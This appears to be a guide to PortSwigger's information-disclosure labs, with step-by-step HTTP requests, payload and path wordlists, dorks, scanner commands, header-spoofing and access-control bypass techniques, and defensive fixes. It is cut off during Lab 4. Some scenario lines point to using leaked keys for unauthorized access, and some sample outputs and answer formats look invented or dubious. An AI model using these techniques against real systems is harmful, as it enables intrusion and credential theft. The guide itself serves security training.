# Information Disclosure - PortSwigger Labs Complete Guide

## Overview

Information disclosure (information leakage) occurs when websites unintentionally reveal sensitive data to users. This can range from data about other users to sensitive business/commercial data, and technical details about the website and its infrastructure.

**Total Labs: 5**
- Apprentice: 4 labs
- Practitioner: 1 lab
- Expert: 0 labs

---

## Lab 1: Information Disclosure in Error Messages

**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

### Objective
Obtain and submit the version number of the vulnerable third-party framework revealed through verbose error messages.

### Vulnerability Description
The application's error handling mechanism displays verbose stack traces that expose the backend technology stack, including framework names and version numbers. This information can be used to identify known vulnerabilities in specific framework versions.

### Step-by-Step Solution

#### 1. Initial Reconnaissance
```
Navigate to any product page in the application
Example: https://LAB-ID.web-security-academy.net/product?productId=1
```

#### 2. Capture Request in Burp Suite
```http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
```

#### 3. Send to Burp Repeater
- Right-click the request in HTTP history
- Select "Send to Repeater"

#### 4. Trigger Exception with Invalid Input
**Modified Request:**
```http
GET /product?productId="example" HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
```

**Alternative Payloads:**
```
productId=abc
productId='test
productId=null
productId=[]
productId={}
productId=-1
```

#### 5. Analyze Error Response
**Response revealing framework:**
```
HTTP/1.1 500 Internal Server Error
Content-Type: text/html

java.lang.NumberFormatException: For input string: "example"
    at org.apache.struts2.components.UIBean.evaluateParams(UIBean.java:123)
    at org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:556)

Apache Struts 2 2.3.31
```

#### 6. Extract Version Information
- Framework: Apache Struts 2
- Version: 2.3.31

#### 7. Submit Solution
Enter the version number: `2 2.3.31`

### Burp Suite Features Employed
1. **HTTP History** - Capture initial requests
2. **Repeater** - Modify and resend requests
3. **Proxy** - Intercept and analyze traffic

### HTTP Requests & Responses

**Exploit Request:**
```http
GET /product?productId="invalid" HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close
```

**Vulnerable Response:**
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Content-Length: 3456

<!DOCTYPE html>
<html>
<body>
<h1>Internal Server Error</h1>
<pre>
java.lang.NumberFormatException: For input string: "invalid"
    at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
    at java.lang.Integer.parseInt(Integer.java:580)
    at org.apache.struts2.components.UIBean.evaluateParams(UIBean.java:123)
    ...
Apache Struts 2 2.3.31
</pre>
</body>
</html>
```

### Common Mistakes & Troubleshooting

**Mistake 1: Using Numeric Values**
```
❌ productId=999999
✓ productId="string"
```
Using large numbers may return "Product not found" instead of triggering a type exception.

**Mistake 2: URL Encoding Issues**
```
❌ productId=%22test%22 (encoded)
✓ productId="test" (raw)
```
Ensure quotes are not double-encoded in Burp Repeater.

**Mistake 3: Missing Version Number Format**
```
❌ 2.3.31
❌ Apache Struts 2 2.3.31
✓ 2 2.3.31
```
The lab expects a specific format with space-separated version components.

**Troubleshooting:**
- If no error appears, try different data types (boolean, array, object)
- Check if errors are suppressed for certain parameters
- Try parameters in different locations (query, body, headers)

### Attack Techniques

#### Technique 1: Parameter Type Confusion
Force the application to process unexpected data types:
```
Integer parameter: productId="string"
String parameter: username=123456789
Boolean parameter: isActive={test}
Array parameter: items=not_an_array
```

#### Technique 2: Boundary Value Testing
```
productId=0
productId=-1
productId=2147483648 (MAX_INT + 1)
productId=null
productId=undefined
```

#### Technique 3: Special Characters
```
productId='
productId="
productId=`
productId=%00
productId=\n
```

#### Technique 4: Format String Attempts
```
productId=%s
productId=%d
productId=%x
productId=${7*7}
productId=#{7*7}
```

### Attack Variations & Alternatives

**Alternative 1: Using Intruder**
- Add parameter to Intruder positions
- Load fuzzing wordlist with invalid types
- Analyze responses for stack traces

**Alternative 2: Automated Scanner**
- Burp Scanner automatically tests for verbose errors
- Review Issues > Information disclosure

**Alternative 3: Manual Browser Testing**
- Modify URL directly: `?productId=abc`
- Useful when Burp isn't available

### Real-World Application Scenarios

**Scenario 1: Framework Exploitation**
```
Discovered: Apache Struts 2.3.31
Known CVE: CVE-2017-5638 (RCE vulnerability)
Impact: Remote code execution possible
Action: Search exploit-db for working exploits
```

**Scenario 2: Technology Stack Mapping**
Information from error messages reveals:
- Programming language (Java)
- Framework (Apache Struts 2)
- Version (2.3.31)
- Potential libraries in stack trace
- Directory structure hints

**Scenario 3: Targeted Attack Planning**
```
1. Error reveals old framework version
2. Research CVEs for that version
3. Test specific exploits
4. Chain with other vulnerabilities
5. Achieve higher impact (RCE, data breach)
```

### Bypass Techniques for Protections

**Protection: Generic Error Pages**
```
Bypass: Look for errors in different contexts
- API endpoints vs web pages
- Different HTTP methods
- Different content types
- WebSocket connections
```

**Protection: Error Code Masking**
```
Bypass: Analyze subtle differences
- Response timing variations
- Content-Length differences
- Redirect behavior changes
- Cache header differences
```

**Protection: Rate Limiting**
```
Bypass: Distribute requests
- Use different parameters
- Vary user agents
- Change source IPs (proxies)
- Slow down request rate
```

### Prevention Best Practices

1. **Implement Custom Error Handlers**
```java
// Bad: Default exception handling
throw new Exception("Product ID: " + productId + " not found");

// Good: Generic error message
return new ErrorResponse("Invalid product identifier", 400);
```

2. **Use Error Codes Instead of Messages**
```java
// Return error codes that map to messages client-side
return new ErrorResponse("ERR_INVALID_INPUT", 400);
```

3. **Log Detailed Errors Server-Side**
```java
logger.error("NumberFormatException for productId: " + productId, exception);
return new ErrorResponse("An error occurred", 500);
```

4. **Configure Framework Error Handling**
```xml
<!-- Struts 2 configuration -->
<struts>
    <constant name="struts.devMode" value="false"/>
    <constant name="struts.i18n.encoding" value="UTF-8"/>
</struts>
```

---

## Lab 2: Information Disclosure on Debug Page

**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page

### Objective
Obtain and submit the SECRET_KEY environment variable disclosed on the debug page.

### Vulnerability Description
Debug pages like phpinfo.php are left accessible in production environments, exposing sensitive configuration data including environment variables, file paths, database settings, and API keys.

### Step-by-Step Solution

#### 1. Initial Reconnaissance
Browse the application homepage and examine the source code.

#### 2. Use Burp Suite Comment Discovery
```
Burp Suite > Target > Site map
Right-click domain > Engagement tools > Find comments
```

#### 3. Locate Debug Reference
**HTML Comment Found:**
```html
<!-- Debug panel: /cgi-bin/phpinfo.php -->
```

#### 4. Access Debug Page
**Request:**
```http
GET /cgi-bin/phpinfo.php HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
```

#### 5. Analyze phpinfo Output
**Response (excerpt):**
```html
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head><title>phpinfo()</title></head>
<body>
<h1>PHP Information</h1>

<h2>Environment Variables</h2>
<table>
  <tr><td>SECRET_KEY</td><td>abc123xyz789secretvalue</td></tr>
  <tr><td>DB_PASSWORD</td><td>********</td></tr>
  <tr><td>API_KEY</td><td>sk_live_...</td></tr>
</table>
</body>
</html>
```

#### 6. Extract Secret Key
Locate the SECRET_KEY variable in the PHP Configuration output.

#### 7. Submit Solution
Enter the SECRET_KEY value in the lab interface.

### Burp Suite Features Employed

1. **Find Comments Tool**
   - Target > Site map > Right-click > Engagement tools > Find comments
   - Automatically extracts all HTML/JS comments

2. **Repeater**
   - Send phpinfo.php request for analysis
   - Modify headers to bypass restrictions if needed

3. **Search Function**
   - Use Burp's search to find "SECRET_KEY" in responses
   - Search across all site map items

### HTTP Requests & Responses

**Discovery Request:**
```http
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
```

**Discovery Response:**
```html
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<!-- TODO: Remove debug panel before production -->
<!-- Debug panel: /cgi-bin/phpinfo.php -->
<head>
    <title>Home</title>
</head>
...
```

**Exploitation Request:**
```http
GET /cgi-bin/phpinfo.php HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

**Exploitation Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 45678

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
...
</style>
<title>phpinfo()</title>
</head>
<body>
<div class="center">
<table>
<tr><td class="e">SECRET_KEY</td><td class="v">your_secret_key_here</td></tr>
</table>
</div>
</body>
</html>
```

### Common Mistakes & Troubleshooting

**Mistake 1: Missing Comment in Source**
```
✓ View page source (Ctrl+U) not just rendered HTML
✓ Check multiple pages, not just homepage
✓ Examine JavaScript files for comments
```

**Mistake 2: Incorrect Path**
```
❌ /phpinfo.php
❌ /debug/phpinfo.php
✓ /cgi-bin/phpinfo.php
```

**Mistake 3: Not Using Burp Tools**
```
Manual review is time-consuming
✓ Use "Find comments" engagement tool
✓ Use "Search" to find keywords
```

**Troubleshooting:**
- If comment not visible, check JavaScript files
- Try common debug paths: /debug, /test, /dev, /admin/debug
- Search for keywords: debug, test, dev, staging, phpinfo

### Attack Techniques

#### Technique 1: Comment Analysis
Search for these patterns in HTML/JS:
```
Debug
TODO
FIXME
HACK
XXX
Temporary
Remove before production
Test endpoint
Dev only
```

#### Technique 2: Common Debug Endpoints
```
/phpinfo.php
/info.php
/cgi-bin/phpinfo.php
/debug
/debug.php
/test.php
/dev
/console
/env
/config
/_debug
/.env
```

#### Technique 3: Path Enumeration
```bash
# Using ffuf
ffuf -u https://target.com/FUZZ -w common-debug-paths.txt

# Using dirsearch
dirsearch -u https://target.com -w debug-wordlist.txt

# Custom wordlist
/admin/phpinfo.php
/test/info.php
/dev/debug.php
/staging/phpinfo.php
```

#### Technique 4: Burp Suite Automated Discovery
```
Burp Scanner > Live audit
Burp Intruder > Debug path fuzzing
Engagement Tools > Find scripts
Engagement Tools > Find comments
```

### Attack Variations & Alternatives

**Alternative 1: Direct Path Guessing**
Without Burp, try common paths directly:
```
https://target.com/phpinfo.php
https://target.com/info.php
https://target.com/cgi-bin/phpinfo.php
```

**Alternative 2: Google Dorking**
```
site:target.com inurl:phpinfo
site:target.com inurl:debug
site:target.com intitle:"phpinfo()"
site:target.com "DEBUG" filetype:php
```

**Alternative 3: Automated Scanner**
```bash
# Nikto
nikto -h https://target.com -C all

# WPScan (for WordPress)
wpscan --url https://target.com --enumerate vp
```

**Alternative 4: Source Code Review**
If source is available:
```bash
# Search for debug code
grep -r "phpinfo()" .
grep -r "var_dump(" .
grep -r "print_r(" .
grep -r "debug" . --include="*.php"
```

### Real-World Application Scenarios

**Scenario 1: Complete Environment Exposure**
```
phpinfo() reveals:
- Database credentials (DB_HOST, DB_USER, DB_PASS)
- API keys (STRIPE_SECRET_KEY, AWS_ACCESS_KEY)
- Internal paths (/var/www/html/app)
- PHP version and loaded modules
- System information

Impact: Full system compromise possible
```

**Scenario 2: API Key Theft**
```
Environment variables exposed:
SECRET_KEY=sk_live_abc123xyz789
STRIPE_SECRET_KEY=sk_test_...
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtn...

Action: Use keys for unauthorized access
```

**Scenario 3: Information for Lateral Movement**
```
Discovered from phpinfo():
- Internal network topology
- Database server addresses
- File system structure
- Loaded modules and versions
- PHP configuration settings

Use for: Planning further attacks
```

**Scenario 4: Compliance Violations**
```
Exposed data includes:
- PCI DSS violation (payment keys exposed)
- GDPR issue (customer data paths revealed)
- Security audit failure
- Regulatory fines possible
```

### Bypass Techniques for Protections

**Protection: Access Control on Debug Pages**
```
Bypass attempts:
1. Try different HTTP methods:
   GET /phpinfo.php    -> 403
   POST /phpinfo.php   -> 200
   HEAD /phpinfo.php   -> 200

2. Add headers:
   X-Forwarded-For: 127.0.0.1
   X-Original-URL: /phpinfo.php
   X-Rewrite-URL: /phpinfo.php

3. Path variations:
   /phpinfo.php       -> 403
   /./phpinfo.php     -> 200
   /phpinfo.php/      -> 200
   /phpinfo.php%20    -> 200
   /phpinfo.php%00    -> 200
```

**Protection: IP Whitelisting**
```
Bypass:
1. Header injection:
   X-Forwarded-For: 127.0.0.1
   X-Real-IP: 127.0.0.1
   X-Originating-IP: 127.0.0.1

2. SSRF to access from localhost
3. Check if VPN/corporate IPs are whitelisted
```

**Protection: Removed from Production**
```
Still check:
- Staging/dev subdomains
- Old backup domains
- Different ports (:8080, :8443)
- Archive.org snapshots
- Git history for credentials
```

### Prevention Best Practices

1. **Never Deploy Debug Pages**
```php
// Bad: Leaving phpinfo accessible
<?php phpinfo(); ?>

// Good: Remove entirely or protect
<?php
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    http_response_code(403);
    exit('Forbidden');
}
if (getenv('APP_ENV') !== 'development') {
    http_response_code(404);
    exit('Not Found');
}
phpinfo();
?>
```

2. **Use Environment-Specific Configuration**
```php
// config.php
if (getenv('APP_ENV') === 'production') {
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    error_reporting(E_ALL & ~E_DEPRECATED & ~E_STRICT);
} else {
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
}
```

3. **Remove Debug Comments**
```bash
# Pre-deployment script
find . -name "*.php" -exec sed -i '/<!-- Debug/d' {} +
find . -name "*.html" -exec sed -i '/TODO.*production/d' {} +
```

4. **Regular Security Audits**
```bash
# Automated checks
grep -r "phpinfo()" . --include="*.php"
grep -r "var_dump(" . --include="*.php"
find . -name "phpinfo.php"
find . -name "info.php"
find . -name "test.php"
```

---

## Lab 3: Source Code Disclosure via Backup Files

**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

### Objective
Identify and submit the database password hard-coded in leaked source code from backup files.

### Vulnerability Description
Backup files with extensions like `.bak`, `.old`, `.backup`, or `~` are left in web-accessible directories, exposing complete source code including hard-coded credentials, API keys, and business logic.

### Step-by-Step Solution

#### 1. Check robots.txt
**Request:**
```http
GET /robots.txt HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

**Response:**
```
User-agent: *
Disallow: /backup
```

#### 2. Explore Backup Directory
**Request:**
```http
GET /backup/ HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

**Response:**
```html
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head><title>Index of /backup</title></head>
<body>
<h1>Index of /backup</h1>
<ul>
<li><a href="ProductTemplate.java.bak">ProductTemplate.java.bak</a></li>
</ul>
</body>
</html>
```

#### 3. Download Backup File
**Request:**
```http
GET /backup/ProductTemplate.java.bak HTTP/1.1
Host: LAB-ID.web-security-academy.net
Accept: text/plain
```

#### 4. Analyze Source Code
**Response (source code):**
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;
import java.io.IOException;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate {

    public static Product getProduct(String productId) throws SQLException, IOException {

        // Connect to database
        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
            "org.postgresql.Driver",
            "postgresql",
            "localhost",
            5432,
            "postgres",
            "postgres",
            "your_password_here_abc123xyz"  // TODO: Move to environment variable
        );

        Connection connection = connectionBuilder.connect();
        Statement statement = connection.createStatement();
        ResultSet resultSet = statement.executeQuery(
            "SELECT * FROM products WHERE id = '" + productId + "'"
        );

        // ... rest of the code
    }
}
```

#### 5. Extract Database Password
Password found: `your_password_here_abc123xyz`

#### 6. Submit Solution
Enter the database password in the lab interface.

### Burp Suite Features Employed

1. **Content Discovery**
   - Burp Suite Pro: Scan > Content Discovery
   - Automatically finds hidden directories and backup files

2. **Site Map**
   - Browse /backup directory
   - View directory listings

3. **Repeater**
   - Download and analyze backup files
   - Test different backup file extensions

4. **Search**
   - Search for "password", "secret", "key" in responses

### HTTP Requests & Responses

**Discovery Request:**
```http
GET /robots.txt HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/plain
Connection: close
```

**Discovery Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 31

User-agent: *
Disallow: /backup
```

**Directory Listing Request:**
```http
GET /backup/ HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

**Directory Listing Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 256

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /backup</title>
 </head>
 <body>
<h1>Index of /backup</h1>
  <ul>
    <li><a href="/backup/ProductTemplate.java.bak">ProductTemplate.java.bak</a></li>
  </ul>
 </body>
</html>
```

**Backup File Request:**
```http
GET /backup/ProductTemplate.java.bak HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

**Backup File Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="ProductTemplate.java.bak"
Content-Length: 2847

package data.productcatalog;

import common.db.JdbcConnectionBuilder;

public class ProductTemplate {
    // Source code with hardcoded credentials
    JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
        "org.postgresql.Driver",
        "postgresql",
        "localhost",
        5432,
        "postgres",
        "postgres",
        "hardcoded_password_here"
    );
    ...
}
```

### Common Mistakes & Troubleshooting

**Mistake 1: Missing robots.txt Check**
```
❌ Directly guessing backup paths
✓ Always check robots.txt first
✓ Check sitemap.xml
✓ Check .well-known/
```

**Mistake 2: Not Trying Different Extensions**
```
Try all common backup extensions:
.bak
.backup
.old
.orig
.copy
.tmp
~
.save
.swp
```

**Mistake 3: Overlooking Directory Listings**
```
❌ Assuming directory listings are disabled
✓ Try accessing directories with trailing slash
✓ Check if index file is missing
```

**Mistake 4: Wrong File Type**
```
Look for backup files of:
- Source code files (.java.bak, .php.bak, .py.bak)
- Configuration files (.conf.bak, .config.bak)
- Database files (.sql.bak, .db.bak)
```

**Troubleshooting:**
- If /backup blocked, try alternatives: /old, /bak, /archive, /temp
- Try different case: /Backup, /BACKUP
- Try with/without trailing slash
- Use Burp Intruder to fuzz directory names

### Attack Techniques

#### Technique 1: robots.txt Reconnaissance
```http
GET /robots.txt HTTP/1.1

Common disallowed paths indicating backups:
Disallow: /backup
Disallow: /old
Disallow: /bak
Disallow: /archive
Disallow: /.git
Disallow: /.svn
Disallow: /temp
Disallow: /tmp
```

#### Technique 2: Backup File Extension Fuzzing
```
Original file: index.php
Test these variants:
index.php.bak
index.php.backup
index.php.old
index.php.orig
index.php.save
index.php.tmp
index.php~
index.php.copy
index.php.1
index.bak.php
index_old.php
index-backup.php
```

#### Technique 3: Common Backup Directories
```
/backup/
/backups/
/old/
/bak/
/archive/
/temp/
/tmp/
/_backup/
/.backup/
/site-backup/
/www-backup/
/public-old/
```

#### Technique 4: Editor Backup Files
```
Different editors create different backups:

Vim:
.index.php.swp
.index.php.swo
index.php~

Emacs:
#index.php#
.#index.php

Nano:
index.php.save

Gedit:
index.php~
```

#### Technique 5: Automated Discovery
```bash
# Using ffuf
ffuf -u https://target.com/FUZZ -w backup-wordlist.txt

# Using dirsearch
dirsearch -u https://target.com -w backup-dirs.txt -e bak,old,backup

# Using Burp Intruder
# Position: /§directory§/§file§.§extension§
# Payloads: directories, filenames, extensions
```

### Attack Variations & Alternatives

**Alternative 1: Direct File Guessing**
```
Known files from website:
/product.php -> Try /product.php.bak
/login.jsp -> Try /login.jsp.old
/config.xml -> Try /config.xml.backup
```

**Alternative 2: Date-Based Backups**
```
/backup/2024-01-15/
/backup/site-backup-2024-01-15.zip
/db-backup-20240115.sql
/backup-jan-15.tar.gz
```

**Alternative 3: Automated Backup Scripts**
```
Common backup filenames:
/backup.sql
/database.sql
/site-backup.zip
/backup.tar.gz
/dump.sql
/export.sql
```

**Alternative 4: Source Code Exposure**
```bash
# Check version control
/.git/config
/.svn/entries
/.hg/
/CVS/

# Check for compressed backups
/backup.zip
/source.tar.gz
/website-backup.7z
```

### Real-World Application Scenarios

**Scenario 1: Full Source Code Exposure**
```
Backup file reveals:
- All application logic
- Database schema
- API endpoints and routes
- Authentication mechanisms
- Business rules
- Hard-coded secrets

Impact: Complete understanding of application for targeted attacks
```

**Scenario 2: Credential Harvesting**
```java
// From backup file
String dbPassword = "prod_db_pass_2024!";
String apiKey = "sk_live_51abc123xyz";
String jwtSecret = "super_secret_jwt_key_do_not_share";
String awsAccessKey = "AKIAIOSFODNN7EXAMPLE";

// Use credentials to:
- Access database directly
- Call APIs with valid keys
- Forge JWT tokens
- Access cloud resources
```

**Scenario 3: SQL Injection Discovery**
```java
// Backup reveals vulnerable code
String query = "SELECT * FROM products WHERE id = '" + productId + "'";
// No prepared statements = SQL injection possible

// Also reveals:
- Table names (products, users, orders)
- Column names (id, username, password)
- Database structure
```

**Scenario 4: Finding Hidden Functionality**
```java
// Backup shows commented-out admin features
// if (user.isAdmin()) {
//     return adminPanel();
// }

// Try to access:
/admin
/adminPanel
?admin=true
?role=admin
```

### Bypass Techniques for Protections

**Protection: No Directory Listing**
```
Bypass: Guess specific filenames
- If you know index.php exists
- Try index.php.bak directly
- Don't rely on directory listing
```

**Protection: Hidden Backup Directory**
```
Discovery methods:
1. robots.txt
2. Sitemap.xml
3. Archive.org
4. Google dorking: site:target.com filetype:bak
5. GitHub search for target domain
6. Error messages revealing paths
```

**Protection: Obfuscated Backup Names**
```
Try patterns:
/backup_a3f7b9/
/bak-20240115-x7y9/
/old-site-v2/
/archive-2024/
/temp-migration/
```

**Protection: Authentication on Backup Directory**
```
Bypass attempts:
1. Try ../ traversal:
   /public/../backup/file.bak

2. Case sensitivity:
   /Backup/ vs /backup/

3. URL encoding:
   /%62ackup/

4. Different methods:
   POST /backup/ (if GET blocked)
```

### Prevention Best Practices

1. **Never Store Backups in Web Root**
```bash
# Bad
/var/www/html/backup/

# Good
/var/backups/website/
/home/backups/
/mnt/backup-drive/
```

2. **Use robots.txt Properly**
```
# Don't reveal sensitive paths
# Bad:
Disallow: /admin-secret-panel
Disallow: /backup
Disallow: /private-files

# Better: Move files outside web root
# Or use authentication, not obscurity
```

3. **Automated Cleanup**
```bash
#!/bin/bash
# deployment-cleanup.sh

# Remove backup files
find /var/www/html -name "*.bak" -delete
find /var/www/html -name "*.old" -delete
find /var/www/html -name "*~" -delete
find /var/www/html -name "*.swp" -delete
find /var/www/html -name "*.save" -delete

# Remove backup directories
rm -rf /var/www/html/backup
rm -rf /var/www/html/old
rm -rf /var/www/html/temp
```

4. **Editor Configuration**
```bash
# .vimrc - Don't create backup files
set nobackup
set nowritebackup
set noswapfile

# .gitignore - Prevent committing backups
*.bak
*.old
*.backup
*~
*.swp
*.save
backup/
old/
```

5. **Web Server Configuration**
```apache
# Apache: Block backup file access
<FilesMatch "\.(bak|backup|old|orig|save|swp)$">
    Require all denied
</FilesMatch>

<DirectoryMatch "^.*/?(backup|old|bak|temp|tmp)">
    Require all denied
</DirectoryMatch>
```

```nginx
# Nginx: Block backup file access
location ~* \.(bak|backup|old|orig|save|swp)$ {
    deny all;
}

location ~* ^.*/?(backup|old|bak|temp|tmp) {
    deny all;
}
```

6. **Code Review Checklist**
```
Before deployment:
□ Remove all .bak files
□ Remove all backup directories
□ Check for hard-coded credentials
□ Remove TODO comments with sensitive info
□ Verify robots.txt doesn't reveal paths
□ Test backup URL access returns 403/404
□ Scan with security tools
```

---

## Lab 4: Authentication Bypass via Information Disclosure

**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

### Objective
Obtain the custom HTTP header name using the TRACE method, use it to bypass IP-based authentication, access the admin interface, and delete the user carlos.

### Credentials Provided
- Username: `wiener`
- Password: `peter`

### Vulnerability Description
The HTTP TRACE method reflects the complete request back to the client, revealing custom headers added by intermediary proxies or load balancers. In this lab, a custom header contains the client's IP address, which is used for authentication. By spoofing this header with a local IP, an attacker can bypass access controls.

### Step-by-Step Solution

#### 1. Identify Access Restriction
**Request:**
```http
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

**Response:**
```http
HTTP/1.1 401 Unauthorized

Admin interface only available if logged in as an administrator, or if requested from localhost.
```

#### 2. Use TRACE Method for Discovery
**Request:**
```http
TRACE /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: */*
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: message/http

TRACE /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: */*
X-Custom-IP-Authorization: 123.45.67.89
```

#### 3. Identify Custom Header
Discovered header: `X-Custom-IP-Authorization: 123.45.67.89`

#### 4. Configure Burp Suite Match and Replace
```
Burp > Proxy > Options > Match and Replace > Add
Type: Request header
Match: (leave empty to add new header)
Replace: X-Custom-IP-Authorization: 127.0.0.1
```

#### 5. Access Admin Interface
**Request (with header injection):**
```http
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Admin Panel</h1>
<ul>
    <li><a href="/admin/delete?username=carlos">Delete carlos</a></li>
    <li><a href="/admin/delete?username=wiener">Delete wiener</a></li>
</ul>
```

#### 6. Delete User Carlos
**Request:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /admin

User deleted successfully
```

### Burp Suite Features Employed

1. **Repeater**
   - Test TRACE method
   - Analyze reflected headers
   - Test admin access with spoofed header

2. **Match and Replace**
   - Proxy > Options > Match and Replace
   - Automatically add/modify headers
   - Persistent header injection

3. **Proxy**
   - Intercept and modify requests
   - Add custom headers manually
   - Test access control bypasses

### HTTP Requests & Responses

**Initial Discovery:**
```http
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Cookie: session=abc123xyz
Connection: close
```

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
Content-Length: 123

<html>
<body>
<h1>Unauthorized</h1>
<p>Admin interface only available if logged in as an administrator, or if requested from localhost</p>
</body>
</html>
```

**TRACE Method Exploitation:**
```http
TRACE / HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 287

TRACE / HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
X-Custom-IP-Authorization: 203.0.113.42
Connection: close
```

**Header Spoofing Attack:**
```http
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0
X-Custom-IP-Authorization: 127.0.0.1
Cookie: session=abc123xyz
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1847

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
<h1>Admin panel</h1>
<div>
    <a href="/admin/delete?username=carlos">Delete carlos</a>
</div>
<div>
    <a href="/admin/delete?username=wiener">Delete wiener</a>
</div>
</body>
</html>
```

**Delete User Request:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
Cookie: session=abc123xyz
Connection: close
```

```http
HTTP/1.1 302 Found
Location: /admin
Content-Length: 0

```

### Common Mistakes & Troubleshooting

**Mistake 1: TRACE Not Working**
```
If TRACE returns 405 Method Not Allowed:
- Server has disabled TRACE
- Try TRACK method (Microsoft IIS)
- Look for headers in other responses
- Check OPTIONS method output
```

**Mistake 2: Wrong IP Format**
```
Try different localhost representations:
✓ 127.0.0.1
✓ localhost
✓ ::1 (IPv6)
✓ 0.0.0.0
✓ 0x7f.0x0.0x0.0x1 (hex)
✓ 2130706433 (decimal)
```

**Mistake 3: Header Not Applied**
```
Ensure header is sent:
- Check in Burp's Logger/HTTP history
- Verify match-and-replace is enabled
- Scope settings may filter the rule
- Check header capitalization
```

**Mistake 4: Forgetting to Delete User**
```
Lab requires specific action:
1. Access admin panel ✓
2. Delete carlos ← Don't forget this step!
```

**Troubleshooting:**
- If TRACE blocked, check error messages for header hints
- Try different paths with TRACE: /admin, /login, /api
- Test if header works without authentication first
- Verify header name matches exactly (case-sensitive)

### Attack Techniques

#### Technique 1: HTTP Method Enumeration
```http
OPTIONS /admin HTTP/1.1
Host: target.com

Response reveals:
Allow: GET, POST, HEAD, OPTIONS, TRACE
```

```http
# Test each method
TRACE /admin HTTP/1.1
TRACK /admin HTTP/1.1
DEBUG /admin HTTP/1.1
```

#### Technique 2: Header Discovery via TRACE
```http
TRACE / HTTP/1.1
Host: target.com

Look for custom headers:
X-Forwarded-For: IP
X-Real-IP: IP
X-Client-IP: IP
X-Custom-IP-Authorization: IP
CF-Connecting-IP: IP (Cloudflare)
True-Client-IP: IP (Akamai)
```

#### Technique 3: IP Spoofing Header Variations
```http
Test these headers:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
